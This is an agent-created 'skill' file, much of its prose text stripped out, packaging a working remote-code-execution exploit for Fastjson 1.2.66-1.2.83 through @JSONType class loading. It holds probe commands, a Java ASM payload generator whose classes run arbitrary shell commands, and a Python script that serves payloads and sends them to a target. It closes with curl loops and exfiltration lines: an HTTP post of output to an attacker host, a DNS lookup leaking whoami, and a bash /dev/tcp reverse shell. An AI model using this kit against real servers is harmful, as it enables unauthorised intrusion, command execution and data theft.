---
name: "fastjson-jsontype-rce"
description: "Fastjson 1.2.66-1.2.83 @JSONType RCE  JDK + Python  + Maven Central  ASM"
agent_created: true
---

# Fastjson 1.2.66-1.2.83 @JSONType RCE

 skill Maven Central  `org.ow2.asm`Java Spring/Hibernate 

---

## 

|  |  |
|------|-----|
|  | QVD-2026-43021 |
|  | Fastjson 1.2.66  1.2.83 |
|  | Spring Boot FatJar / SafeMode=false / Linux |
| JDK | 8  RCE11/17/21  fd  |

`checkAutoType`  `getResourceAsStream`  `@type`  `.``/`  URL `@JSONType`  class 

---

## 

```bash
#  "autoType is not support"  Fastjson 1.2.68+
curl -X POST TARGET_URL -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.AutoCloseable","x":1}'

# DNSLog 
curl -X POST TARGET_URL -H "Content-Type: application/json" \
  -d '{"@type":"java.net.Inet4Address","val":"YOUR.dnslog.cn"}'

# SafeMode 
curl TARGET_URL/info 2>/dev/null | grep -i safeMode
# safeMode=true  false  
```

---

## 

### 

```bash
mkdir -p lib stage
curl -o lib/asm-9.6.jar https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar
```

### PayloadKit.java

 `PayloadKit.java` `stage/`  class 

```java
import org.objectweb.asm.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;

/**
 * Generate @JSONType-annotated class files via ASM.
 * JDK 8 mode: one .class; fd mode: JAR + 255 .class files.
 */
public class PayloadKit {

    private final long peerAddr;
    private final int  peerPort;
    private final String cmdLine;
    private final Random rng = new Random();

    PayloadKit(String ip, int port, String cmd) {
        this.peerAddr = toNumeric(ip);
        this.peerPort = port;
        this.cmdLine  = cmd;
    }

    // ---- entry ----
    public static void main(String[] args) throws Exception {
        String ip   = args[0];
        int    port = Integer.parseInt(args[1]);
        String cmd  = args[2];
        String mode = args.length > 3 ? args[3] : "direct";

        Files.createDirectories(Paths.get("stage"));
        PayloadKit kit = new PayloadKit(ip, port, cmd);
        if ("fd".equals(mode)) kit.writeFdSet();
        else                   kit.writeDirect();
    }

    // ---- JDK 8  class ----
    void writeDirect() throws Exception {
        String label = "D" + randomHex(6);
        String fqcn  = "http." + peerAddr + "." + peerPort + "." + label;
        Files.write(Paths.get("stage/" + label + ".class"), assemble(fqcn, cmdLine));
        System.out.println("stage/" + label + ".class  (" + fqcn + ")");
    }

    // ---- fd mode (JDK 11+) ----
    void writeFdSet() throws Exception {
        String label = "F" + randomHex(6);
        String jarName = "bundle_" + label + ".jar";

        // Boot class goes in JAR, fetched via jar:http
        String entryClass = "seed." + label + "_Boot";
        byte[] jarBytes = buildJar(entryClass, cmdLine);
        Files.write(Paths.get("stage/" + jarName), jarBytes);

        // 255 classes, one per /proc/self/fd/3..255
        for (int slot = 3; slot <= 255; slot++) {
            String fqcn = "slot" + slot + "." + label + "_S" + slot;
            byte[] raw  = assemble(fqcn, cmdLine);
            Path dir = Paths.get("stage/slots/" + slot);
            Files.createDirectories(dir);
            Files.write(dir.resolve(label + "_S" + slot + ".class"), raw);
        }
        System.out.println("stage/" + jarName + " + stage/slots/3..255/*.class");
    }

    // ---- entry ----
    byte[] assemble(String fqcn, String cmd) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        String path = fqcn.replace('.', '/');

        cw.visit(Opcodes.V1_6, Opcodes.ACC_PUBLIC, path, null,
                 "java/lang/Object", null);

        //  @JSONType   Fastjson ""
        AnnotationVisitor ann = cw.visitAnnotation(
            "Lcom/alibaba/fastjson/annotation/JSONType;", true);
        ann.visitEnd();

        // <clinit>  Runtime.exec(new String[]{"/bin/sh","-c",cmd})
        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        mv.visitCode();

        mv.visitInsn(Opcodes.ICONST_3);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn("/bin/sh");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitLdcInsn("-c");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitLdcInsn(cmd);
        mv.visitInsn(Opcodes.AASTORE);

        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                           "()Ljava/lang/Runtime;", false);
        mv.visitInsn(Opcodes.SWAP);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                           "([Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitInsn(Opcodes.POP);
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }

    byte[] buildJar(String fqcn, String cmd) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(buf)) {
            byte[] cls = assemble(fqcn, cmd);
            zip.putNextEntry(new ZipEntry(fqcn.replace('.', '/') + ".class"));
            zip.write(cls);
            zip.closeEntry();
            // manifest
            zip.putNextEntry(new ZipEntry("META-INF/MANIFEST.MF"));
            zip.write("Manifest-Version: 1.0\n".getBytes());
            zip.closeEntry();
        }
        return buf.toByteArray();
    }

    static long toNumeric(String ip) {
        String[] p = ip.split("\\.");
        return ((Long.parseLong(p[0]) & 0xFF) << 24)
             | ((Long.parseLong(p[1]) & 0xFF) << 16)
             | ((Long.parseLong(p[2]) & 0xFF) << 8)
             |  (Long.parseLong(p[3]) & 0xFF);
    }

    static String randomHex(int n) {
        byte[] b = new byte[(n + 1) / 2];
        new Random().nextBytes(b);
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x", x & 0xFF));
        return sb.substring(0, n);
    }
}
```

### 

```bash
javac -cp lib/asm-9.6.jar PayloadKit.java
```

### dispatch.py

 `dispatch.py` HTTP  `stage/`  payload 

```python
#!/usr/bin/env python3
"""Fastjson @JSONType RCE   HTTP  + payload """
import sys, json, time, struct, socket, threading, os
from http.server import HTTPServer, SimpleHTTPRequestHandler

BIND_HOST = sys.argv[1]
BIND_PORT = int(sys.argv[2])
TARGET    = sys.argv[3].rstrip('/')
PATH      = sys.argv[4] if len(sys.argv) > 4 else '/'
MODE      = sys.argv[5] if len(sys.argv) > 5 else 'direct'

IP_INT = struct.unpack('!I', socket.inet_aton(BIND_HOST))[0]

def guess_label():
    """Scan stage/ for the generated label."""
    for f in os.listdir('stage'):
        if f.endswith('.class') and len(f) > 7:
            return f[:-6]  # strip .class
        if f.startswith('bundle_') and f.endswith('.jar'):
            return f[7:-4]
    return None

def run_http():
    """Start HTTP server in background thread."""
    os.chdir('stage')
    srv = HTTPServer(('0.0.0.0', BIND_PORT), SimpleHTTPRequestHandler)
    srv.timeout = 0.5
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f'[*] serving stage/ on :{BIND_PORT}')

def fire():
    """Construct and send the JSON payload."""
    import urllib.request
    label = guess_label()
    if not label:
        print('[-] no label found in stage/  run PayloadKit first')
        return

    if MODE == 'fd':
        # 255-element array for fd enumeration
        parts = [{
            "@type": f"jar:http:..{IP_INT}:{BIND_PORT}.bundle_{label}!.seed.{label}_Boot"
        }]
        for slot in range(3, 256):
            parts.append({
                "@type": f"jar:file:.proc.self.fd.{slot}!.slot{slot}.{label}_S{slot}"
            })
        body = json.dumps(parts)
    else:
        body = json.dumps({
            "@type": f"jar:http:..{IP_INT}:{BIND_PORT}.{label}!.http.{IP_INT}.{BIND_PORT}.{label}",
            "x": 1
        })

    req = urllib.request.Request(TARGET + PATH,
        data=body.encode(), headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=90)
        print(f'[+] payload sent ({MODE} mode, {len(body)} bytes)')
    except Exception as e:
        print(f'[!] {e}')

if __name__ == '__main__':
    run_http()
    fire()
    print('[*] waiting for OOB (45s)...')
    time.sleep(45)
```

### 

```bash
#  stage/  class 
java -cp .:lib/asm-9.6.jar PayloadKit <ATTACKER_IP> <PORT> "id" direct   # JDK 8
java -cp .:lib/asm-9.6.jar PayloadKit <ATTACKER_IP> <PORT> "id" fd       # JDK 11+

# 
python3 dispatch.py <ATTACKER_IP> <PORT> TARGET_URL /parse direct
python3 dispatch.py <ATTACKER_IP> <PORT> TARGET_URL /parse fd
```

###  curl Python

```bash
#  HTTP 
cd stage && python3 -m http.server <PORT> &

# JDK 8
curl -X POST TARGET_URL -H "Content-Type: application/json" \
  -d '{"@type":"jar:http:..INT_IP:PORT.LABEL!.http.INT_IP.PORT.LABEL","x":1}'

# JDK 17/21   fd
for slot in $(seq 3 255); do
  curl -X POST TARGET_URL -H "Content-Type: application/json" \
    -d "[{\"@type\":\"jar:http:..INT_IP:PORT.bundle_LABEL!.seed.LABEL_Boot\"},{\"@type\":\"jar:file:.proc.self.fd.$slot!.slot$slot.LABEL_S$slot\"}]"
done
```

---

## Payload 

|  | Payload  |
|------|-------------|
|  | `{"@type":"java.lang.AutoCloseable","x":1}` |
| DNSLog | `{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}` |
| JDK 8 SSRF  | `{"@type":"http:..INT_IP:PORT.X"}` |
| JDK 8 RCE | `{"@type":"jar:http:..INT_IP:PORT.LABEL!.http.INT_IP.PORT.LABEL","x":1}` |
| JDK 17/21 RCE |  255  `jar:file:.proc.self.fd.N!.slotN.LABEL_SN` |

**IP ** `replace('.','/')`  URL

```python
python3 -c "import socket,struct; print(struct.unpack('!I',socket.inet_aton('IP'))[0])"
```

---

## 

 HTTP  OOB

- **HTTP ** `| curl -X POST --data-binary @- http://ATTACKER:PORT/out`
- **DNSLog**`nslookup $(whoami).xxx.dnslog.cn`
- ** Shell**`bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`

---

## 

- `..`  `replace('.','/')`  `//`
- FatJar  `@type="http:..INT_IP:PORT.X"`  GET    WAR 
- Windows  fd  `/proc/self/fd`
-  `/bin/sh -c` Linux/macOS
